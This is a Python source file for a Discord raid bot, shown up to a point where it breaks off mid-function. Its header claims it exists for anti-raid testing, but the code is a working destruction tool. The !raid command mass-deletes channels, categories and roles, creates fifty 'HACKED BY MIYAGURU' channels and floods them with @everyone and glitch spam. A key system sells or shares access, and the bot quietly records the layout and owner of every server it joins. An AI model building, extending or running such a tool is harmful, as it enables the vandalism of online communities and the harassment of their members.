"""
╔══════════════════════════════════════════════════════╗
║            MIYAGURU RAID BOT v6.0                    ║
║      Para testar Anti-Raid — USO APENAS EM          ║
║      SERVIDOR PRÓPRIO OU COM PERMISSÃO              ║
╚══════════════════════════════════════════════════════╝

AVISO: Este bot é APENAS para fins educacionais e
teste de segurança. Use apenas em servidores que
você possui ou tem permissão explícita para testar.
"""

import discord
from discord import PermissionOverwrite
import asyncio
import os
import json
import random
import time
import string
import datetime

# ============================================================
# CONFIGURAÇÕES
# ============================================================

TOKEN = os.getenv("RAID_BOT_TOKEN", "COLE_SEU_TOKEN_AQUI")

# DONO — Apenas esse ID tem acesso total sem key
OWNER_ID = 1490921333750759487

# Nomes dos canais para criar
CHANNEL_NAMES = [
    "Dominado por Miyaguru",
    "HACKED BY MIYAGURU",
    "R A I D",
    "SERVER TAKEN OVER",
    "HACKED",
]

# Quantas mensagens enviar por canal
MSG_PER_CHANNEL = 15

# Mensagens corrompidas/glitch
GLITCH_MESSAGES = [
    "@everyone",
    "̷̧̛̖̣̤̥̦̩̫̪̗̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅ ̶̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ ̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚",
    "̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅͅ @everyone",
    "░▒▓█ HACKED █▓▒░",
    "◆◇◈◉◎●○◐◑◒◓◔◕◖◗◘◙◚",
    "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄",
    "╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗",
    "┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐",
    "▓▒░ CORRUPTED ░▒▓",
    "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏",
    "█▓▒░ RAID ░▒▓█",
    "╭───「 RAID 」───╮\n│ Dominado por Miyaguru │\n╰────────────────╯",
    "̷̢̧̛̖̣̤̥̦̩̫̪̗̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚",
    "⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣀",
    "̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ @everyone",
    "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄",
    "═══╗\nHACKED BY\nMIYAGURU\n═══╝",
]

# ============================================================
# SETUP DO BOT
# ============================================================

intents = discord.Intents.all()
bot = discord.Bot(intents=intents)

RAID_ACTIVE = False
BACKUP_FILE = "server_backup.json"
KEYS_FILE = "bot_keys.json"
SERVER_CONFIGS_FILE = "server_configs.json"  # Configs persistentes (funciona mesmo banido)


# ============================================================
# SISTEMA DE KEYS
# ============================================================

def load_keys():
    """Carrega keys do arquivo JSON"""
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"keys": {}}


def save_keys(data):
    """Salva keys no arquivo JSON"""
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ============================================================
# SISTEMA DE CONFIGS PERSISTENTES
# ============================================================

def load_server_configs():
    """Carrega configs persistentes dos servidores salvos"""
    if os.path.exists(SERVER_CONFIGS_FILE):
        with open(SERVER_CONFIGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"servers": {}}


def save_server_configs(data):
    """Salva configs persistentes no arquivo JSON"""
    with open(SERVER_CONFIGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


async def save_server_config(guild):
    """Salva as configs do servidor de forma persistente (mesmo se o bot for banido)"""
    print(f"\n[CONFIG] Salvando configs do servidor {guild.name} ({guild.id})...")

    config = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "owner_id": guild.owner_id,
        "owner_name": str(guild.owner) if guild.owner else None,
        "member_count": guild.member_count,
        "icon_url": str(guild.icon.url) if guild.icon else None,
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "categories": [],
        "roles": [],
        "channels": [],
    }

    # --- Categorias com permissões ---
    for cat in guild.categories:
        cat_data = {
            "name": cat.name,
            "position": cat.position,
            "permissions": [],
        }
        for target, overwrite in cat.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
                "target_name": target.name if hasattr(target, "name") else str(target.id),
            }
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            cat_data["permissions"].append(perm_entry)
        config["categories"].append(cat_data)

    # --- Roles com permissões ---
    for role in guild.roles:
        if role.is_default():
            continue
        role_data = {
            "name": role.name,
            "color": f"{role.color.r},{role.color.g},{role.color.b}",
            "permissions": role.permissions.value,
            "position": role.position,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
        }
        config["roles"].append(role_data)

    # --- Canais com permissões ---
    for channel in guild.channels:
        if isinstance(channel, discord.CategoryChannel):
            continue
        channel_data = {
            "name": channel.name,
            "type": str(channel.type),
            "category_name": channel.category.name if channel.category else None,
            "position": channel.position,
            "topic": getattr(channel, "topic", None),
            "slowmode_delay": getattr(channel, "slowmode_delay", 0),
            "nsfw": getattr(channel, "is_nsfw", lambda: False)(),
            "permissions": [],
        }
        for target, overwrite in channel.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
                "target_name": target.name if hasattr(target, "name") else str(target.id),
            }
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            channel_data["permissions"].append(perm_entry)
        config["channels"].append(channel_data)

    # Salvar no arquivo persistente
    configs = load_server_configs()
    configs["servers"][str(guild.id)] = config
    save_server_configs(configs)

    print(f"       {len(config['categories'])} categorias")
    print(f"       {len(config['roles'])} roles")
    print(f"       {len(config['channels'])} canais")
    print(f"[CONFIG] Salvo em: {SERVER_CONFIGS_FILE}")
    return config


async def restore_from_config(guild, guild_id=None):
    """Restaura um servidor a partir das configs persistentes (funciona mesmo sem backup local)"""
    configs = load_server_configs()

    # Determinar qual servidor restaurar
    if guild_id:
        config = configs["servers"].get(str(guild_id))
    else:
        config = configs["servers"].get(str(guild.id))

    if not config:
        return False, "Nenhuma config salva encontrada para este servidor!"

    print(f"\n[RESTORE-CONFIG] Restaurando servidor: {config.get('guild_name', '?')}")

    # Apagar tudo existente em paralelo
    print("[RESTORE-CONFIG] Apagando canais e categorias existentes...")
    async def delete_fast(item):
        try:
            await item.delete()
            return True
        except Exception:
            return False

    all_items = list(guild.channels) + list(guild.categories)
    tasks = [delete_fast(item) for item in all_items]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    deleted_channels = 0
    deleted_cats = 0
    for r, item in zip(results, all_items):
        if r is True:
            if isinstance(item, discord.CategoryChannel):
                deleted_cats += 1
            else:
                deleted_channels += 1

    print(f"       {deleted_channels} canais apagados")
    print(f"       {deleted_cats} categorias apagadas")
    await asyncio.sleep(2)

    restored = {"categories": 0, "roles": 0, "channels": 0}

    # 1. Roles
    print("[RESTORE-CONFIG] Restaurando roles...")
    role_map = {}
    for role_data in sorted(config.get("roles", []), key=lambda x: x.get("position", 0)):
        try:
            color_parts = role_data["color"].split(",")
            color = discord.Color.from_rgb(
                int(color_parts[0].strip()),
                int(color_parts[1].strip()),
                int(color_parts[2].strip()),
            )
            new_role = await guild.create_role(
                name=role_data["name"],
                color=color,
                permissions=discord.Permissions(role_data["permissions"]),
                hoist=role_data.get("hoist", False),
                mentionable=role_data.get("mentionable", False),
            )
            role_map[role_data["name"]] = new_role
            restored["roles"] += 1
        except Exception as e:
            print(f"       Erro role {role_data['name']}: {e}")
    print(f"       {restored['roles']} roles")

    # 2. Categorias com permissões
    print("[RESTORE-CONFIG] Recriando categorias...")
    cat_map = {}
    for cat_data in sorted(config.get("categories", []), key=lambda x: x.get("position", 0)):
        try:
            overwrites = rebuild_overwrites(guild, cat_data.get("permissions", []))
            new_cat = await guild.create_category(name=cat_data["name"], overwrites=overwrites)
            cat_map[cat_data["name"]] = new_cat
            restored["categories"] += 1
        except Exception as e:
            print(f"       Erro categoria {cat_data['name']}: {e}")
    print(f"       {restored['categories']} categorias")

    # 3. Canais com permissões
    print("[RESTORE-CONFIG] Recriando canais...")
    for channel_data in sorted(config.get("channels", []), key=lambda x: x.get("position", 0)):
        try:
            category = None
            cat_name = channel_data.get("category_name")
            if cat_name and cat_name in cat_map:
                category = cat_map[cat_name]

            overwrites = rebuild_overwrites(guild, channel_data.get("permissions", []))
            ch_type = channel_data["type"].lower()
            name = channel_data["name"]

            if "text" in ch_type:
                await guild.create_text_channel(
                    name=name, category=category,
                    topic=channel_data.get("topic"),
                    slowmode_delay=channel_data.get("slowmode_delay", 0),
                    nsfw=channel_data.get("nsfw", False),
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            elif "voice" in ch_type:
                await guild.create_voice_channel(
                    name=name, category=category,
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            else:
                await guild.create_text_channel(
                    name=name, category=category,
                    topic=channel_data.get("topic"),
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            restored["channels"] += 1
        except Exception as e:
            print(f"       Erro canal {channel_data['name']}: {e}")
    print(f"       {restored['channels']} canais")
    print(f"\n[RESTORE-CONFIG] CONCLUÍDO!")

    return True, (
        f"✅ Restaurado (do config persistente)!\n"
        f"🗑️ {deleted_channels} canais apagados\n"
        f"🗂️ {deleted_cats} categorias apagadas\n"
        f"📁 {restored['categories']} categorias recriadas\n"
        f"📋 {restored['roles']} roles recriadas\n"
        f"📂 {restored['channels']} canais recriados\n"
        f"🔒 Permissões aplicadas"
    )


def generate_key(length=24):
    """Gera uma key aleatória"""
    chars = string.ascii_uppercase + string.digits
    return "MIYA-" + "-".join("".join(random.choices(chars, k=4)) for _ in range(length // 4))


def parse_duration(duration_str):
    """Converte duração em segundos. Retorna None se lifetime."""
    d = duration_str.strip().lower()
    if d == "lifetime":
        return None  # Lifetime = nunca expira
    if d == "30m" or d == "30":
        return 30 * 60
    if d == "1h" or d == "1h":
        return 1 * 3600
    if d == "30d" or d == "30d":
        return 30 * 86400
    if d == "1y" or d == "1ano" or d == "1year":
        return 365 * 86400
    if d == "2y" or d == "2anos" or d == "2year":
        return 730 * 86400
    # Tentar interpretar segundos direto
    try:
        return int(d)
    except ValueError:
        return None


def format_remaining(seconds):
    """Formata segundos restantes em texto legível"""
    if seconds is None:
        return "♾️ Lifetime"
    if seconds <= 0:
        return "❌ Expirada"
    if seconds < 60:
        return f"{int(seconds)}s restantes"
    if seconds < 3600:
        mins = int(seconds // 60)
        return f"{mins}min restantes"
    if seconds < 86400:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}min restantes"
    days = int(seconds // 86400)
    hours = int((seconds % 86400) // 3600)
    return f"{days} dias {hours}h restantes"


def is_key_valid(key_data):
    """Verifica se uma key ainda é válida"""
    if key_data.get("expires") is None:
        return True  # Lifetime
    return time.time() < key_data["expires"]


# ============================================================
# EVENTOS
# ============================================================

@bot.event
async def on_ready():
    print("=" * 50)
    print("  MIYAGURU RAID BOT v6.0 — ONLINE")
    print(f"  Logado como: {bot.user}")
    print(f"  ID: {bot.user.id}")
    print(f"  Owner ID: {OWNER_ID}")
    print("=" * 50)
    print("\nComandos do bot:")
    print("  !raid          — RAID COMPLETO (apaga + cria + spam)")
    print("  !raid stop     — Para")
    print("  !backup        — Backup com permissões")
    print("  !restore       — Restaurar com permissões")
    print("\nComandos de Key (só Owner):")
    print("  !key gen <duração>  — Gerar key")
    print("  !keys               — Painel de keys")
    print("  !key revoke <key>   — Revogar key")
    print("  !help               — Ajuda")
    print("\nUso por outros: primeiro use !use <key>")
    print("\n" + "=" * 50)

    # Auto-salva configs de todos os servidores ao iniciar
    print("\n[AUTO-CONFIG] Salvando configs de todos os servidores...")
    for g in bot.guilds:
        try:
            await save_server_config(g)
            print(f"       ✅ {g.name} ({g.id})")
        except Exception as e:
            print(f"       ❌ {g.name}: {e}")
    print(f"[AUTO-CONFIG] {len(bot.guilds)} servidores processados")


@bot.event
async def on_guild_join(guild):
    """Quando o bot entra num servidor novo, salva as configs automaticamente"""
    print(f"\n[GUILD JOIN] Bot adicionado ao servidor: {guild.name} ({guild.id})")
    print(f"             Dono: {guild.owner} ({guild.owner_id})")
    print(f"             Membros: {guild.member_count}")
    try:
        await asyncio.sleep(3)  # Espera o bot carregar tudo
        config = await save_server_config(guild)
        print(f"[GUILD JOIN] Configs salvas: {len(config['categories'])} cats, {len(config['roles'])} roles, {len(config['channels'])} canais")
    except Exception as e:
        print(f"[GUILD JOIN] Erro ao salvar: {e}")


@bot.event
async def on_guild_remove(guild):
    """Quando o bot é removido/banido, registra o evento"""
    print(f"\n[GUILD REMOVE] Bot removido do servidor: {guild.name} ({guild.id})")
    print(f"               (As configs já estão salvas em server_configs.json)")


# ============================================================
# BACKUP / RESTORE COM PERMISSÕES
# ============================================================

async def save_backup(guild):
    """Salva backup COMPLETO com permissões"""
    print("\n[BACKUP] Salvando backup do servidor...")

    backup_data = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "timestamp": None,
        "categories": [],
        "roles": [],
        "channels": [],
    }

    # --- Categorias com permissões completas ---
    for cat in guild.categories:
        cat_data = {
            "id": cat.id,
            "name": cat.name,
            "position": cat.position,
            "permissions": [],
        }
        for target, overwrite in cat.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
            }
            # No py-cord, iterar sobre overwrite retorna (perm_name, value) tuples
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            cat_data["permissions"].append(perm_entry)
        backup_data["categories"].append(cat_data)

    # --- Roles com permissões completas ---
    for role in guild.roles:
        if role.is_default():
            continue
        role_perms = role.permissions.value
        role_data = {
            "id": role.id,
            "name": role.name,
            "color": f"{role.color.r},{role.color.g},{role.color.b}",
            "permissions": role_perms,
            "position": role.position,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
        }
        backup_data["roles"].append(role_data)

    # --- Canais com permissões completas ---
    for channel in guild.channels:
        # Ignora categorias (já salvas acima)
        if isinstance(channel, discord.CategoryChannel):
            continue

        channel_data = {
            "id": channel.id,
            "name": channel.name,
            "type": str(channel.type),
            "category_id": channel.category.id if channel.category else None,
            "category_name": channel.category.name if channel.category else None,
            "position": channel.position,
            "topic": getattr(channel, "topic", None),
            "slowmode_delay": getattr(channel, "slowmode_delay", 0),
            "permissions": [],
        }
        for target, overwrite in channel.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
            }
            # No py-cord, iterar sobre overwrite retorna (perm_name, value) tuples
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            channel_data["permissions"].append(perm_entry)
        backup_data["channels"].append(channel_data)

    backup_data["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")

    with open(BACKUP_FILE, "w", encoding="utf-8") as f:
        json.dump(backup_data, f, indent=2, ensure_ascii=False)

    print(f"       {len(backup_data['categories'])} categorias (com permissões)")
    print(f"       {len(backup_data['roles'])} roles (com permissões)")
    print(f"       {len(backup_data['channels'])} canais (com permissões)")
    print(f"[BACKUP] Salvo em: {BACKUP_FILE}")
    return backup_data


def rebuild_overwrites(guild, perm_entries):
    """Reconstrói os overwrites a partir dos dados do backup"""
    overwrites = {}
    for entry in perm_entries:
        # Encontrar o target (role ou member)
        target_id = entry["target_id"]
        target_type = entry["target_type"]

        if target_type == "role":
            target = guild.get_role(target_id)
        else:
            target = guild.get_member(target_id)

        if target is None:
            continue

        # Construir PermissionOverwrite
        kwargs = {}
        for key, value in entry.items():
            if key in ("target_id", "target_type"):
                continue
            if isinstance(value, dict) and "allow" in value and "deny" in value:
                if value["allow"]:
                    kwargs[key] = True
                elif value["deny"]:
                    kwargs[key] = False
                else:
                    kwargs[key] = None  # Permissão neutra

        if kwargs:
            try:
                overwrites[target] = PermissionOverwrite(**kwargs)
            except Exception as e:
                print(f"       [WARN] Erro ao criar overwrite para {target}: {e}")

    return overwrites


async def restore_backup(guild):
    """Apaga todos os canais + categorias + recria tudo com permissões"""
    if not os.path.exists(BACKUP_FILE):
        return False, "Nenhum backup encontrado!"

    print("\n[RESTORE] Carregando backup...")

    with open(BACKUP_FILE, "r", encoding="utf-8") as f:
        backup = json.load(f)

    restored = {"categories": 0, "roles": 0, "channels": 0}

    # 0. APAGAR TODOS OS CANAIS E CATEGORIAS EM PARALELO
    print("[RESTORE] Apagando todos os canais e categorias (paralelo)...")

    async def delete_fast(item):
        try:
            await item.delete()
            return True
        except Exception:
            return False

    # Apagar tudo em paralelo: canais + categorias
    all_items = list(guild.channels) + list(guild.categories)
    tasks = [delete_fast(item) for item in all_items]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    # Separar contagens corretamente
    deleted_channels = 0
    deleted_cats = 0
    for r, item in zip(results, all_items):
        if r is True:
            if isinstance(item, discord.CategoryChannel):
                deleted_cats += 1
            else:
                deleted_channels += 1

    print(f"       {deleted_channels} canais apagados")
    print(f"       {deleted_cats} categorias apagadas")

    # Esperar um pouco pro Discord registrar as deleções
    await asyncio.sleep(2)

    # 1. Roles primeiro (precisamos delas pra aplicar permissões depois)
    print("[RESTORE] Restaurando roles...")
    role_map = {}  # Mapear nome -> nova role
    for role_data in sorted(backup.get("roles", []), key=lambda x: x.get("position", 0)):
        try:
            color_parts = role_data["color"].split(",")
            color = discord.Color.from_rgb(
                int(color_parts[0].strip()),
                int(color_parts[1].strip()),
                int(color_parts[2].strip()),
            )
            new_role = await guild.create_role(
                name=role_data["name"],
                color=color,
                permissions=discord.Permissions(role_data["permissions"]),
                hoist=role_data.get("hoist", False),
                mentionable=role_data.get("mentionable", False),
            )
            role_map[role_data["name"]] = new_role
            restored["roles"] += 1
        except Exception as e:
            print(f"       Erro role {role_data['name']}: {e}")
    print(f"       {restored['roles']} roles")

    # 2. Categorias com permissões
    print("[RESTORE] Recriando categorias com permissões...")
    cat_map = {}
    for cat_data in sorted(backup.get("categories", []), key=lambda x: x.get("position", 0)):
        try:
            overwrites = rebuild_overwrites(guild, cat_data.get("permissions", []))

            new_cat = await guild.create_category(name=cat_data["name"], overwrites=overwrites)
            cat_map[cat_data["name"]] = new_cat
            restored["categories"] += 1
        except Exception as e:
            print(f"       Erro categoria {cat_data['name']}: {e}")
    print(f"       {restored['categories']} categorias")

    # 3. Canais nas categorias com permissões
    print("[RESTORE] Restaurando canais com permissões...")
    for channel_data in sorted(backup.get("channels", []), key=lambda x: x.get("position", 0)):
        try:
            category = None
            cat_name = channel_data.get("category_name")
            if cat_name and cat_name in cat_map:
                category = cat_map[cat_name]

            # Montar permissões do canal
            overwrites = rebuild_overwrites(guild, channel_data.get("permissions", []))

            ch_type = channel_data["type"].lower()
            name = channel_data["name"]

            if "text" in ch_type:
                await guild.create_text_channel(
                    name=name,
                    category=category,
                    topic=channel_data.get("topic"),
                    slowmode_delay=channel_data.get("slowmode_delay", 0),
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            elif "voice" in ch_type:
                await guild.create_voice_channel(
                    name=name,
                    category=category,
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            else:
                # Fallback: criar como text
                await guild.create_text_channel(
                    name=name,
                    category=category,
                    topic=channel_data.get("topic"),
                    position=channel_data.get("position", 0),
                    overwrites=overwrites,
                )
            restored["channels"] += 1
        except Exception as e:
            print(f"       Erro canal {channel_data['name']}: {e}")

    print(f"       {restored['channels']} canais")
    print(f"\n[RESTORE] CONCLUÍDO!")

    return True, (
        f"✅ Restaurado!\n"
        f"🗑️ {deleted_channels} canais apagados\n"
        f"🗂️ {deleted_cats} categorias apagadas\n"
        f"📁 {restored['categories']} categorias recriadas\n"
        f"📋 {restored['roles']} roles recriadas\n"
        f"📂 {restored['channels']} canais recriados\n"
        f"🔒 Permissões aplicadas"
    )


# ============================================================
# RAID FUNCTIONS (PARALELO COM GATHER)
# ============================================================

async def delete_channel_fast(channel):
    """Apaga um canal"""
    try:
        await channel.delete()
        return True
    except Exception:
        return False


async def create_channel_fast(guild, name):
    """Cria um canal — sem retry, cria na base do possível"""
    try:
        channel = await guild.create_text_channel(name=name)
        return channel
    except Exception:
        return None


async def send_message_fast(channel, message, retries=3):
    """Envia uma mensagem com retry pra rate limit"""
    for attempt in range(retries):
        try:
            await channel.send(message)
            return True
        except Exception as e:
            error_msg = str(e).lower()
            if "rate" in error_msg or "429" in error_msg:
                wait = 0.5 * (attempt + 1)
                await asyncio.sleep(wait)
                continue
            else:
                return False
    return False


async def delete_all_channels(guild):
    """Apaga TODOS os canais em paralelo"""
    tasks = [delete_channel_fast(ch) for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    deleted = sum(1 for r in results if r is True)
    return deleted


async def delete_all_categories(guild):
    """Apaga TODAS as categorias em paralelo"""
    tasks = [delete_channel_fast(cat) for cat in list(guild.categories)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    deleted = sum(1 for r in results if r is True)
    return deleted


async def delete_all_roles(guild):
    """Apaga todas as roles"""
    deleted = 0
    for role in list(guild.roles):
        try:
            if role.is_default():
                continue
            if role.position >= guild.me.top_role.position:
                continue
            await role.delete()
            deleted += 1
        except Exception:
            pass
    return deleted


async def create_all_channels(guild, count=50):
    """Cria 50 canais em paralelo — instantâneo"""
    tasks = [
        create_channel_fast(guild, random.choice(CHANNEL_NAMES))
        for _ in range(count)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    channels = [r for r in results if r is not None and isinstance(r, discord.TextChannel)]
    return channels


async def spam_channel_fast(channel, count=MSG_PER_CHANNEL):
    """Envia várias mensagens em 1 canal"""
    tasks = [
        send_message_fast(channel, random.choice(GLITCH_MESSAGES))
        for _ in range(count)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for r in results if r is True)
    return sent


async def spam_all_channels(channels):
    """Spam em TODOS os canais em paralelo"""
    tasks = [spam_channel_fast(ch) for ch in channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    total = sum(r for r in results if isinstance(r, int))
    return total


# ============================================================
# COMANDOS
# ============================================================

@bot.event
async def on_message(message):
    global RAID_ACTIVE

    if message.author.bot:
        return

    guild = message.guild
    if not guild:
        return

    content = message.content.strip()

    # ============================================================
    # SISTEMA DE AUTENTICAÇÃO
    # ============================================================

    # Owner tem acesso total — nunca precisa de key
    is_owner = (message.author.id == OWNER_ID)

    if not is_owner:
        # Carrega as keys autorizadas
        keys_data = load_keys()

        # Verificar se o usuário já está autenticado com key válida
        user_authenticated = False
        for key_str, key_info in keys_data["keys"].items():
            if key_info.get("user_id") == message.author.id and is_key_valid(key_info):
                user_authenticated = True
                break

        # Permitir comandos públicos sempre (!use, !help, !info)
        is_public_cmd = (content.startswith("!use ") or content == "!help" or content == "!info")

        if not user_authenticated and not is_public_cmd:
            try:
                await message.channel.send(
                    f"🔒 **Acesso negado!**\n"
                    f"Você precisa de uma key para usar este bot.\n"
                    f"Use `!use <sua_key>` para ativar ou peça uma key ao dono."
                )
            except Exception:
                pass
            return

    # ============================================================
    # COMANDOS DE KEY
    # ============================================================

    # ---- !use <key> (Qualquer um pode usar) ----
    if content.startswith("!use "):
        key_str = content[5:].strip()
        keys_data = load_keys()
        if key_str not in keys_data["keys"]:
            try:
                await message.channel.send("❌ Key inválida!")
            except Exception:
                pass
            return

        key_info = keys_data["keys"][key_str]
        if not is_key_valid(key_info):
            try:
                await message.channel.send("❌ Essa key já expirou!")
            except Exception:
                pass
            return
        if key_info.get("revoked"):
            try:
                await message.channel.send("❌ Essa key foi revogada pelo dono!")
            except Exception:
                pass
            return

        # Vincular key ao usuário
        key_info["user_id"] = int(message.author.id)
        key_info["user_name"] = str(message.author)
        key_info["activated_at"] = time.time()
        save_keys(keys_data)

        try:
            await message.channel.send(
                f"✅ **Key ativada com sucesso!**\n"
                f"🔑 Key: `{key_str}`\n"
                f"👤 Usuário: {message.author.mention}\n"
                f"⏱️ Expira em: {format_remaining(key_info.get('expires') - time.time() if key_info.get('expires') else None)}\n"
                f"\nAgora você pode usar todos os comandos do bot!"
            )
        except Exception:
            pass
        return

    # ---- !key gen <duração> (SÓ OWNER) ----
    if content.startswith("!key gen ") and is_owner:
        duration_str = content[9:].strip()
        duration_secs = parse_duration(duration_str)
        if duration_secs is None and duration_str.lower() != "lifetime":
            try:
                await message.channel.send(
                    "❌ **Duração inválida!**\n\n"
                    "Use: `30m`, `1h`, `30d`, `1y`, `2y`, `lifetime`\n"
                    "Exemplo: `!key gen 1h`"
                )
            except Exception:
                pass
            return

        key_str = generate_key()
        now = time.time()
        expires = now + duration_secs if duration_secs else None

        keys_data = load_keys()
        keys_data["keys"][key_str] = {
            "created_at": now,
            "created_by": OWNER_ID,
            "duration": duration_str,
            "expires": expires,
            "user_id": None,
            "user_name": None,
            "activated_at": None,
            "revoked": False,
        }
        save_keys(keys_data)

        remaining = format_remaining(expires - now if expires else None)
        try:
            await message.channel.send(
                f"🔑 **Key gerada com sucesso!**\n\n"
                f"```{key_str}```\n"
                f"⏱️ Duração: `{duration_str}`\n"
                f"⏳ Expira em: {remaining}\n"
                f"\nEnvie essa key para alguém e peça pra usar `!use {key_str}`"
            )
        except Exception:
            pass
        return

    # ---- !keys (Painel — SÓ OWNER) ----
    if content == "!keys" and is_owner:
        keys_data = load_keys()
        keys = keys_data["keys"]
        if not keys:
            try:
                await message.channel.send("📋 **Nenhuma key gerada ainda.**\nUse `!key gen <duração>` para criar.")
            except Exception:
                pass
            return

        total_keys = len(keys)
        active_keys = sum(1 for k in keys.values() if is_key_valid(k) and not k.get("revoked"))
        used_keys = sum(1 for k in keys.values() if k.get("activated_at") and is_key_valid(k))
        expired_keys = sum(1 for k in keys.values() if not is_key_valid(k))
        revoked_keys = sum(1 for k in keys.values() if k.get("revoked"))

        embed_desc = (
            f"**📊 Estatísticas:**\n"
            f"🔑 Total geradas: `{total_keys}`\n"
            f"✅ Ativas: `{active_keys}`\n"
            f"👥 Em uso: `{used_keys}`\n"
            f"❌ Expiradas: `{expired_keys}`\n"
            f"🚫 Revogadas: `{revoked_keys}`\n\n"
        )

        for key_str, key_info in keys.items():
            status_icon = "🟢" if (is_key_valid(key_info) and not key_info.get("revoked")) else "🔴"
            if key_info.get("revoked"):
                status_icon = "🚫"

            user_display = key_info.get("user_name", "Ninguém")
            expires_display = format_remaining(
                key_info.get("expires") - time.time() if key_info.get("expires") else None
            )
            duration_display = key_info.get("duration", "?")

            embed_desc += (
                f"**{status_icon} `{key_str}`**\n"
                f"   ⏱️ Duração: `{duration_display}`\n"
                f"   👤 Usada por: {user_display}\n"
                f"   ⏳ Status: {expires_display}\n\n"
            )

        try:
            await message.channel.send(embed_desc)
        except Exception:
            pass
        return

    # ---- !key revoke <key> (SÓ OWNER) ----
    if content.startswith("!key revoke ") and is_owner:
        key_str = content[12:].strip()
        keys_data = load_keys()
        if key_str not in keys_data["keys"]:
            try:
                await message.channel.send("❌ Key não encontrada!")
            except Exception:
                pass
            return

        keys_data["keys"][key_str]["revoked"] = True
        keys_data["keys"][key_str]["user_id"] = None
        keys_data["keys"][key_str]["user_name"] = None
        save_keys(keys_data)

        try:
            await message.channel.send(f"🚫 Key `{key_str}` revogada com sucesso!")
        except Exception:
            pass
        return

    # ============================================================
    # COMANDOS DO BOT (requer autenticação)
    # ============================================================

    # ---- !raid ----
    if content == "!raid":
        if RAID_ACTIVE:
            try:
                await message.reply("⚠️ Raid já está ativo!")
            except Exception:
                pass
            return

        RAID_ACTIVE = True

        # Backup automático COM PERMISSÕES
        print("[RAID] Backup automático (com permissões)...")
        await save_backup(guild)

        try:
            await message.channel.send("🚨 RAID INICIADO!")
        except Exception:
            pass

        print("\n[RAID] INICIANDO RAID COMPLETO...")

        # Fase 1: Apagar canais (PARALELO)
        print("[1/5] Apagando canais (paralelo)...")
        deleted_ch = await delete_all_channels(guild)
        print(f"      {deleted_ch} canais apagados")

        # Fase 2: Apagar categorias (PARALELO)
        print("[2/5] Apagando categorias (paralelo)...")
        deleted_cat = await delete_all_categories(guild)
        print(f"      {deleted_cat} categorias apagadas")

        # Fase 3: Apagar roles
        print("[3/5] Apagando roles...")
        deleted_r = await delete_all_roles(guild)
        print(f"      {deleted_r} roles apagadas")

        # Fase 4: Criar canais (PARALELO)
        print("[4/5] Criando 50 canais (paralelo)...")
        new_channels = await create_all_channels(guild, count=50)
        created = len(new_channels)
        print(f"      {created} canais criados")

        # Fase 5: Spam 15 msgs por canal (PARALELO)
        print("[5/5] Enviando 15 msgs por canal (paralelo)...")
        sent = await spam_all_channels(new_channels)
        print(f"      {sent} mensagens enviadas")

        print(f"\n[RAID] RAID CONCLUÍDO!")
        print(f"       Canais apagados: {deleted_ch}")
